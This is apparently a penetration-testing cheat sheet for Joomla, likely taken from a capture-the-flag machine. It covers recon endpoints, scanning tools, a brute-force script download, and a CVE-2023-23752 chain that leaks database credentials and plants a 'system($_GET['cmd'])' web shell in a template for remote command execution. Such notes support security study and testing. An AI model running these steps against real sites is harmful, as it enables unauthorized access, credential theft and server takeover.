
# Manual Endpoint Reconnaissance

When performing manual reconnaissance on a Joomla site, check for the following common endpoints:

```text
/robots.txt
/README.txt
/LICENSE.txt
/administrator/manifests/files/joomla.xml
/language/en-GB/en-GB.xml
/plugins/system/cache/cache.xml
/web.config
```

# Automated Endpoint Discovery

## Using Droopescan
Droopescan can automatically scan for common Joomla endpoints:
```bash
droopescan scan joomla --url http://joomla-site.local/
```

## Using Joomscan (OWASP)
Joomscan is another tool specifically for Joomla vulnerability assessment.

### Installation
```bash
git clone https://github.com/rezasp/joomscan.git
cd joomscan
perl joomscan.pl
```

# Exploitation

## Bruteforce Attack

Default credentials for Joomla are often `admin:admin`. To perform a brute-force attack:

### Download and Use joomla-brute.py
```bash
wget https://raw.githubusercontent.com/ajnik/joomla-bruteforce/master/joomla-brute.py
python3 joomla-brute.py -u http://joomla-site.local/ -w /usr/share/metasploit-framework/data/wordlists/http_default_pass.txt -usr admin
```

## CVE-2023-23752 to Code Execution

### Extracting Joomla! MySQL Credentials
This CVE allows accessing Joomla configuration, including MySQL credentials in plain-text.

#### Exploitation Steps
1. Use curl to extract configuration data:
```bash
    curl -v http://10.9.49.205/api/index.php/v1/config/application?public=true
```
1. With MySQL credentials in hand, log in to the Joomla admin interface and modify a template for RCE.
2. Navigate to Site templates > Editor, and modify `error.php` to include:
```php
    system($_GET['cmd']);
```
1. Execute commands via the modified template:
```bash
    curl -s http://dev.devvortex.htb/templates/cassiopeia/error.php\?cmd\=id
```
